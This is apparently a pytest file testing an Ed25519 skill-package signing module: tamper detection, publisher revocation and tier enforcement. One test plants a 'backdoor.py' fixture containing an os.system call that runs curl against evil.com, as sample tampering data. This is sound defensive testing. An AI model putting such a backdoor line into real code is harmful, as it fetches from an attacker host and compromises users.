"""
Tests for S3 Skill Signing and Verification.

Covers:
- Sign + verify round-trip succeeds
- Tampered skill fails verification
- Revoked publisher fails verification
- Tier enforcement
"""
from __future__ import annotations

import tempfile
from pathlib import Path

import pytest

from amc.shield.s3_signing import SkillSigner, SIGNATURE_FILENAME


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture()
def signer() -> SkillSigner:
    return SkillSigner(db_path=":memory:")


@pytest.fixture()
def skill_dir() -> Path:
    """Create a temporary skill directory with some files."""
    d = Path(tempfile.mkdtemp(prefix="test_skill_"))
    (d / "main.py").write_text("print('hello')\n")
    (d / "utils.py").write_text("def helper(): return 42\n")
    (d / "README.md").write_text("# Test Skill\n")
    return d


@pytest.fixture()
def publisher_and_key(signer: SkillSigner):
    identity, private_key_pem = signer.register_publisher(
        name="TestCorp", domain="test.com", email="dev@test.com", tier="org",
    )
    return identity, private_key_pem


# ---------------------------------------------------------------------------
# Sign + Verify Round-Trip
# ---------------------------------------------------------------------------

class TestSignVerify:
    """Ed25519 sign and verify for skill packages."""

    def test_sign_and_verify_succeeds(
        self, signer: SkillSigner, skill_dir: Path, publisher_and_key
    ) -> None:
        identity, pk = publisher_and_key
        sig = signer.sign_skill(skill_dir, identity.publisher_id, pk)
        assert sig.publisher_id == identity.publisher_id
        assert sig.skill_hash
        assert sig.signature_bytes_hex

        # Signature file written
        assert (skill_dir / SIGNATURE_FILENAME).exists()

        result = signer.verify_skill(skill_dir)
        assert result.valid, result.reason
        assert result.publisher is not None
        assert result.publisher.publisher_id == identity.publisher_id

    def test_unsigned_skill_fails(self, signer: SkillSigner, skill_dir: Path) -> None:
        result = signer.verify_skill(skill_dir)
        assert not result.valid
        assert "no signature" in result.reason.lower()

    def test_verify_returns_publisher_info(
        self, signer: SkillSigner, skill_dir: Path, publisher_and_key
    ) -> None:
        identity, pk = publisher_and_key
        signer.sign_skill(skill_dir, identity.publisher_id, pk)
        result = signer.verify_skill(skill_dir)
        assert result.valid
        assert result.publisher is not None
        assert result.publisher.name == "TestCorp"
        assert result.publisher.domain == "test.com"


# ---------------------------------------------------------------------------
# Tampered Skill Detection
# ---------------------------------------------------------------------------

class TestTamperedSkill:
    """Modifying skill files after signing must fail verification."""

    def test_modified_file_fails_verify(
        self, signer: SkillSigner, skill_dir: Path, publisher_and_key
    ) -> None:
        identity, pk = publisher_and_key
        signer.sign_skill(skill_dir, identity.publisher_id, pk)

        # Tamper with a file
        (skill_dir / "main.py").write_text("print('HACKED')\n")

        result = signer.verify_skill(skill_dir)
        assert not result.valid
        assert "hash mismatch" in result.reason.lower() or "tampered" in result.reason.lower()

    def test_added_file_fails_verify(
        self, signer: SkillSigner, skill_dir: Path, publisher_and_key
    ) -> None:
        identity, pk = publisher_and_key
        signer.sign_skill(skill_dir, identity.publisher_id, pk)

        # Add a new file
        (skill_dir / "backdoor.py").write_text("import os; os.system('curl evil.com')\n")

        result = signer.verify_skill(skill_dir)
        assert not result.valid

    def test_deleted_file_fails_verify(
        self, signer: SkillSigner, skill_dir: Path, publisher_and_key
    ) -> None:
        identity, pk = publisher_and_key
        signer.sign_skill(skill_dir, identity.publisher_id, pk)

        # Delete a file
        (skill_dir / "utils.py").unlink()

        result = signer.verify_skill(skill_dir)
        assert not result.valid

    def test_corrupted_signature_file_fails(
        self, signer: SkillSigner, skill_dir: Path, publisher_and_key
    ) -> None:
        identity, pk = publisher_and_key
        signer.sign_skill(skill_dir, identity.publisher_id, pk)

        # Corrupt the signature file
        (skill_dir / SIGNATURE_FILENAME).write_text("{bad json")

        result = signer.verify_skill(skill_dir)
        assert not result.valid
        assert "malformed" in result.reason.lower()


# ---------------------------------------------------------------------------
# Revoked Publisher
# ---------------------------------------------------------------------------

class TestRevokedPublisher:
    """Revoked publishers must fail verification."""

    def test_revoked_publisher_fails_verify(
        self, signer: SkillSigner, skill_dir: Path, publisher_and_key
    ) -> None:
        identity, pk = publisher_and_key
        signer.sign_skill(skill_dir, identity.publisher_id, pk)

        # Verify works before revocation
        assert signer.verify_skill(skill_dir).valid

        # Revoke
        signer.revoke_publisher(identity.publisher_id, reason="compromised key")

        # Now verification should fail
        result = signer.verify_skill(skill_dir)
        assert not result.valid
        assert "revoked" in result.reason.lower()

    def test_revoked_publisher_cannot_sign_new(
        self, signer: SkillSigner, skill_dir: Path, publisher_and_key
    ) -> None:
        identity, pk = publisher_and_key
        signer.revoke_publisher(identity.publisher_id, reason="test")

        # Signing still works (it's verification that rejects)
        signer.sign_skill(skill_dir, identity.publisher_id, pk)
        result = signer.verify_skill(skill_dir)
        assert not result.valid
        assert "revoked" in result.reason.lower()


# ---------------------------------------------------------------------------
# Tier Enforcement
# ---------------------------------------------------------------------------

class TestTierEnforcement:
    """require_signed enforces minimum publisher tier."""

    def test_require_signed_with_sufficient_tier(
        self, signer: SkillSigner, skill_dir: Path, publisher_and_key
    ) -> None:
        identity, pk = publisher_and_key  # tier=org
        signer.sign_skill(skill_dir, identity.publisher_id, pk)

        # org >= individual — should pass
        result = signer.require_signed(skill_dir, min_tier="individual")
        assert result.valid

    def test_require_signed_insufficient_tier_raises(
        self, signer: SkillSigner, skill_dir: Path
    ) -> None:
        # Register individual-tier publisher
        identity, pk = signer.register_publisher(
            name="Solo Dev", domain="solo.io", email="a@solo.io", tier="individual",
        )
        signer.sign_skill(skill_dir, identity.publisher_id, pk)

        # Require enterprise tier — should raise
        with pytest.raises(ValueError, match="tier"):
            signer.require_signed(skill_dir, min_tier="enterprise")

    def test_require_signed_unsigned_raises(
        self, signer: SkillSigner, skill_dir: Path
    ) -> None:
        with pytest.raises(ValueError, match="failed"):
            signer.require_signed(skill_dir)
